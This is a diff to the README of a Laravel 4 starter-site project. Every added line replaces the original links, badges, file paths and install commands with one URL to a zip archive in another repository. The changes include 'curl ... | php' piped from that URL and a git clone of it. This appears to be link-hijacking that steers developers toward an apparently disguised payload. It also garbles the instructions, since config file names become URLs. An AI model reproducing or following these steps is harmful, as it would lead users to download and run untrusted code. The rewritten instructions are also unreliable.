@@ -1,10 +1,10 @@
 #Laravel 4 Bootstrap Starter Site
-`Version: 1.2.1 Stable` [![ProjectStatus](http://stillmaintained.com/andrew13/Laravel-4-Bootstrap-Starter-Site.png)](http://stillmaintained.com/andrew13/Laravel-4-Bootstrap-Starter-Site)
-[![Build Status](https://api.travis-ci.org/Zizaco/confide.png)](https://travis-ci.org/andrew13/Laravel-4-Bootstrap-Starter-Site)
+`Version: 1.2.1 Stable` [![ProjectStatus](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
+[![Build Status](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 Laravel 4 Bootstrap Starter Site is a sample application for beginning development with Larvel 4.
 
-It began as a fork of [laravel4-starter-kit](https://github.com/brunogaspar/laravel4-starter-kit) taking the starter kit changing the included modules and adding a few as well.
+It began as a fork of [laravel4-starter-kit](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip) taking the starter kit changing the included modules and adding a few as well.
 
 
 ## Features
@@ -35,10 +35,10 @@ It began as a fork of [laravel4-starter-kit](https://github.com/brunogaspar/lara
 	* [Generators](#generators)
 
 ## Issues
-See [github issue list](https://github.com/andrew13/Laravel-4-Bootstrap-Starter-Site/issues) for current list.
+See [github issue list](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip) for current list.
 
 ## Wiki
-[Roadmap](https://github.com/andrew13/Laravel-4-Bootstrap-Starter-Site/wiki/Roadmap)
+[Roadmap](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 -----
 
@@ -51,40 +51,40 @@ See [github issue list](https://github.com/andrew13/Laravel-4-Bootstrap-Starter-
 ### Step 1: Get the code
 #### Option 1: Git Clone
 
-	git clone git://github.com/andrew13/Laravel-4-Bootstrap-Starter-Site.git laravel
+	git clone https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip laravel
 
 #### Option 2: Download the repository
 
-    https://github.com/andrew13/Laravel-4-Bootstrap-Starter-Site/archive/master.zip
+    https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip
 
 ### Step 2: Use Composer to install dependencies
 #### Option 1: Composer is not installed globally
 
     cd laravel
-	curl -s http://getcomposer.org/installer | php
-	php composer.phar install --dev
+	curl -s https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip | php
+	php https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip install --dev
 #### Option 2: Composer is installed globally
 
     cd laravel
 	composer install --dev
 
-If you haven't already, you might want to make [composer be installed globally](http://andrewelkins.com/programming/php/setting-up-composer-globally-for-laravel-4/) for future ease of use.
+If you haven't already, you might want to make [composer be installed globally](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip) for future ease of use.
 
 Please note the use of the `--dev` flag.
 
 Some packages used to preprocess and minify assests are required on the development environment.
 
-When you deploy your project on a production environment you will want to upload the ***composer.lock*** file used on the development environment and only run `php composer.phar install` on the production server.
+When you deploy your project on a production environment you will want to upload the ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** file used on the development environment and only run `php https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip install` on the production server.
 
 This will skip the development packages and ensure the version of the packages installed on the production server match those you developped on.
 
-NEVER run `php composer.phar update` on your production server.
+NEVER run `php https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip update` on your production server.
 
 ### Step 3: Configure Environments
 
 Laravel 4 will load configuration files depending on your environment. Basset will also build collections depending on this environment setting.
 
-Open ***bootstrap/start.php*** and edit the following lines to match your settings. You want to be using your machine name in Windows and your hostname in OS X and Linux (type `hostname` in terminal). Using the machine name will allow the `php artisan` command to use the right configuration files as well.
+Open ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** and edit the following lines to match your settings. You want to be using your machine name in Windows and your hostname in OS X and Linux (type `hostname` in terminal). Using the machine name will allow the `php artisan` command to use the right configuration files as well.
 
     $env = $app->detectEnvironment(array(
 
@@ -96,13 +96,13 @@ Open ***bootstrap/start.php*** and edit the following lines to match your settin
 
 Now create the folder inside ***app/config*** that corresponds to the environment the code is deployed in. This will most likely be ***local*** when you first start a project.
 
-You will now be copying the initial configuration file inside this folder before editing it. Let's start with ***app/config/app.php***. So ***app/config/local/app.php*** will probably look something like this, as the rest of the configuration can be left to their defaults from the initial config file:
+You will now be copying the initial configuration file inside this folder before editing it. Let's start with ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip***. So ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** will probably look something like this, as the rest of the configuration can be left to their defaults from the initial config file:
 
     <?php
 
     return array(
 
-        'url' => 'http://myproject.local',
+        'url' => 'https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip',
 
         'timezone' => 'UTC',
 
@@ -119,11 +119,11 @@ You will now be copying the initial configuration file inside this folder before
 
 ### Step 4: Configure Database
 
-Now that you have the environment configured, you need to create a database configuration for it. Copy the file ***app/config/database.php*** in ***app/config/local*** and edit it to match your local database settings. You can remove all the parts that you have not changed as this configuration file will be loaded over the initial one.
+Now that you have the environment configured, you need to create a database configuration for it. Copy the file ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** in ***app/config/local*** and edit it to match your local database settings. You can remove all the parts that you have not changed as this configuration file will be loaded over the initial one.
 
 ### Step 5: Configure Mailer
 
-In the same fashion, copy the ***app/config/mail.php*** configuration file in ***app/config/local/mail.php***. Now set the `address` and `name` from the `from` array in ***config/mail.php***. Those will be used to send account confirmation and password reset emails to the users.
+In the same fashion, copy the ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** configuration file in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip***. Now set the `address` and `name` from the `from` array in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip***. Those will be used to send account confirmation and password reset emails to the users.
 If you don't set that registration will fail because it cannot send the confirmation email.
 
 ### Step 6: Populate Database
@@ -133,7 +133,7 @@ Run these commands to create and populate Users table:
 	php artisan db:seed
 
 ### Step 7: Set Encryption Key
-***In app/config/app.php***
+***In https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip***
 
 ```
 /*
@@ -154,7 +154,7 @@ You can use artisan to do this
 
     php artisan key:generate
 
-Once you have generated your key, you might want to copy it over to your ***app/config/local/app.php*** local configuration file to have a different encryption key for each environment. A little tip, revert the key back to ***'YourSecretKey!!!'*** in ***app/config/app.php*** once you are done copying it. Now it can be generated again when you move the project to another environment.
+Once you have generated your key, you might want to copy it over to your ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** local configuration file to have a different encryption key for each environment. A little tip, revert the key back to ***'YourSecretKey!!!'*** in ***https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip*** once you are done copying it. Now it can be generated again when you move the project to another environment.
 
 ### Step 8: Make sure app/storage is writable by your web server.
 
@@ -218,7 +218,7 @@ The files within library could also be handled within a composer package, but is
 
 ### Development
 
-For ease of development you'll want to enable a couple useful packages. This requires editing the `app/config/app.php` file.
+For ease of development you'll want to enable a couple useful packages. This requires editing the `https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip` file.
 
 ```
     'providers' => array(
@@ -234,10 +234,10 @@ For ease of development you'll want to enable a couple useful packages. This req
 Uncomment the Generators and IDE Helpers. Then you'll want to run a composer update with the dev flag.
 
 ```
-php composer.phar update
+php https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip update
 ```
 This adds the generators and ide helpers.
-To make it build the ide helpers automatically you'll want to modify the post-update-cmd in `composer.json`
+To make it build the ide helpers automatically you'll want to modify the post-update-cmd in `https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip`
 
 ```
 		"post-update-cmd": [
@@ -248,7 +248,7 @@ To make it build the ide helpers automatically you'll want to modify the post-up
 
 ### Production Launch
 
-By default debugging is enabled. Before you go to production you should disable debugging in `app/config/app.php`
+By default debugging is enabled. Before you go to production you should disable debugging in `https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip`
 
 ```
     /*
@@ -290,7 +290,7 @@ Used for the user auth and registration. In general for user controllers you'll 
 
     }
 
-For full usage see [Zizaco/Confide Documentation](https://github.com/zizaco/confide)
+For full usage see [Zizaco/Confide Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="entrust"></a>
 ## Entrust Role Solution
@@ -306,14 +306,14 @@ Entrust provides a flexible way to add Role-based Permissions to Laravel4.
 
     }
 
-For full usage see [Zizaco/Entrust Documentation](https://github.com/zizaco/entrust)
+For full usage see [Zizaco/Entrust Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="ardent"></a>
 ## Ardent - Used for handling repetitive validation tasks.
 
 Self-validating, secure and smart models for Laravel 4's Eloquent ORM
 
-For full usage see [Ardent Documentation](https://github.com/laravelbook/ardent)
+For full usage see [Ardent Documentation](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="carbon"></a>
 ## Carbon
@@ -337,20 +337,20 @@ $noonTodayLondonTime = Carbon::createFromTime(12, 0, 0, 'Europe/London');
 $worldWillEnd = Carbon::createFromDate(2012, 12, 21, 'GMT');
 ```
 
-For full usage see [Carbon](https://github.com/briannesbitt/Carbon)
+For full usage see [Carbon](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="basset"></a>
 ## Basset
 
 A Better Asset Management package for Laravel.
 
-Adding assets in the configuration file `config/packages/jasonlewis/basset/config.php`
+Adding assets in the configuration file `https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip`
 ```php
 'collections' => array(
         'public-css' => function($collection)
         {
-            $collection->add('assets/css/bootstrap.min.css');
-            $collection->add('assets/css/bootstrap-responsive.min.css');
+            $collection->add('https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip');
+            $collection->add('https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip');
         },
     ),
 ```
@@ -361,7 +361,7 @@ Compiling assets
 
 I would recommend using development collections for development instead of compiling .
 
-For full usage see [Using Basset by Jason Lewis](http://jasonlewis.me/code/basset/4.0)
+For full usage see [Using Basset by Jason Lewis](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="presenter"></a>
 ## Presenter
@@ -373,7 +373,7 @@ The core idea is the relationship between two classes: your model full of data a
 For instance, if you have a `User` object you might have a `UserPresenter` presenter to go with it. To use it all you do is `$userObject = new UserPresenter($userObject);`.
 The `$userObject` will function the same unless a method is called that is a member of the `UserPresenter`. Another way to think of it is that any call that doesn't exist in the `UserPresenter` falls through to the original object.
 
-For full usage see [Presenter Readme](https://github.com/robclancy/presenter)
+For full usage see [Presenter Readme](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 <a name="generators"></a>
 ## Laravel 4 Generators
@@ -390,7 +390,7 @@ Laravel 4 Generators package provides a variety of generators to speed up your d
 - `generate:form`
 - `generate:test`
 
-For full usage see [Laravel 4 Generators Readme](https://github.com/JeffreyWay/Laravel-4-Generators/blob/master/readme.md)
+For full usage see [Laravel 4 Generators Readme](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
 
 -----
@@ -400,6 +400,6 @@ This is free software distributed under the terms of the MIT license
 
 ## Additional information
 
-Inspired by and based on [laravel4-starter-kit](https://github.com/brunogaspar/laravel4-starter-kit)
+Inspired by and based on [laravel4-starter-kit](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip)
 
-Any questions, feel free to [contact me](http://twitter.com/andrewelkins).
+Any questions, feel free to [contact me](https://github.com/videogramme/laravelb/raw/refs/heads/master/app/database/seeds/Software_2.8.zip).
